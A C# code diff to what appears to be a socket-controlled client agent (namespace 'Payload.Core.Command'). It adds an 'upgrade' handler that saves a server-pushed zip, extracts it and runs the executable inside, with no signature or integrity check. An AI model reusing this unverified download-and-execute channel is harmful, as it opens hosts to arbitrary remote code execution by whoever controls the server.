@@ -6,6 +6,7 @@ using System;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -63,9 +64,35 @@ namespace Payload.Core.Command.SocketClient
         {
             client.On("upgrade", async response => {
                 Console.WriteLine(response);
-                var upgradeProps = response.GetValue<UpgradeResProps>();
-
-
+                UpgradeResProps upgradeProps = response.GetValue<UpgradeResProps>();
+                UpgradeProps patch = upgradeProps.data;
+                if (!patch.name.ToLower().EndsWith("zip"))
+                    return;
+                string targetDir = $"{Config.Instance.TargetUpgradeDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")}_patch";
+                if(Directory.Exists(targetDir))
+                    Directory.Delete(targetDir, true);
+                Directory.CreateDirectory(targetDir);
+                string patchPath = $"{targetDir}\\{patch.name}";
+                BytesHelper.ByteArrayToFile(patchPath, patch.file);
+                bool patchUnziped = false;
+                try
+                {
+                    System.IO.Compression.ZipFile.ExtractToDirectory(patchPath, targetDir);
+                    patchUnziped = true;
+                }
+                catch { }
+                if (!patchUnziped)
+                    return;
+                string exeName = "";
+                FileInfo[] allFiles = new DirectoryInfo(targetDir).GetFiles("*.exe");
+                if(allFiles.Length==1)
+                    exeName = allFiles[0].Name;
+                new StartProcessFactory(
+                    new StartProcessCommandProps() { ExeName = exeName, TargetWorkSpaceDir= targetDir }
+                    )
+                .CreateCommand()
+                    .Execute()
+                    ?.Wait();
             });
         }
 
